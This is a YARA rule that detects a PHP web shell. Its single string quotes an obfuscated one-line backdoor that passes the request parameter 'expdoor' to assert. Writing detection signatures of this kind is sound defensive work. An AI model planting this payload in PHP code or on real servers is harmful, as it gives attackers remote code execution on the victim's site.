rule Webshell_webshells_new_xxx_RID31DF : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Web shells - generated from file xxx.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-28 13:41:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s3 = "<?php array_map(\"ass\\x65rt\",(array)$_REQUEST['expdoor']);?>" fullword
   condition: 
      all of them
}